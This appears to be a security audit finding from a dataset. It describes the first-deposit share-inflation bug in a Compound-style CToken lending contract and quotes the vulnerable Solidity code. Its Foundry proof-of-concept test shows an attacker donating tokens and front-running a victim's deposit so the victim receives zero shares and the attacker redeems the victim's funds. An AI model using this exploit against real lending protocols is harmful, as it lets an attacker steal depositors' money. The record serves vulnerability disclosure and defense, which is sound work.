# [M] First Deposit Bug

## Summary
Severity: Medium
Contest weight: 0.6221
Dataset id: 18006
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The CToken is a yield bearing asset which is minted when any user deposits some units of `underlying` tokens. The amount of CTokens minted to a user is calculated based upon the amount of `underlying` tokens user is depositing.

As per the implementation of CToken contract, there exists two cases for CToken amount calculation:

1. First deposit - when `CToken.totalSupply()` is `0`.
2. All subsequent deposits.

Here is the actual CToken code (extra code and comments clipped for better reading):
```solidity
function exchangeRateStoredInternal() internal view virtual returns (uint) {
    uint _totalSupply = totalSupply;
    if (_totalSupply == 0) {
        return initialExchangeRateMantissa;
    } else {
        uint totalCash = getCashPrior();
        uint cashPlusBorrowsMinusReserves = totalCash +
            totalBorrows -
            totalReserves;
        uint exchangeRate = (cashPlusBorrowsMinusReserves * expScale) /
            _totalSupply;

        return exchangeRate;
    }
}

function mintFresh(address minter, uint mintAmount) internal {
    // ...
    Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});

    uint actualMintAmount = doTransferIn(minter, mintAmount);

    uint mintTokens = div_(actualMintAmount, exchangeRate);

    totalSupply = totalSupply + mintTokens;
    accountTokens[minter] = accountTokens[minter] + mintTokens;
}
```

## Proof of Concept
New test case was added to `forge-tests/lending/fToken/fDAI.t.sol`
```solidity
function test_bug_firstMintIssue() public {
    address attacker = alice;

    seedUserDAI(attacker, 2_000_000e18);
    seedUserDAI(bob, 1_000_000e18);
    assertEq(fDAI.exchangeRateStored(), 2e26);
    assertEq(fDAI.totalSupply(), 0);
    assertEq(fDAI.balanceOf(attacker), 0);

    vm.prank(attacker);
    DAI.approve(address(fDAI), type(uint256).max);
    vm.prank(attacker);
    fDAI.mint(2e8);
    assertEq(fDAI.balanceOf(attacker), 1);
    assertEq(fDAI.totalSupply(), 1);

    vm.prank(bob);
    DAI.approve(address(fDAI), type(uint256).max);

    // Front-running
    vm.prank(attacker);
    DAI.transfer(address(fDAI), 1_000_000e18);
    assertEq(fDAI.getCash(), 1_000_000e18 + 2e8);

    vm.prank(bob);
    fDAI.mint(1_000_000e18);
    assertEq(fDAI.balanceOf(bob), 0);
    assertEq(fDAI.totalSupply(), 1);

    vm.prank(attacker);
    fDAI.redeem(1);
    assertEq(DAI.balanceOf(attacker), 3_000_000e18);
    assertEq(fDAI.totalSupply(), 0);
}
```

## Recommendation
No recommendation
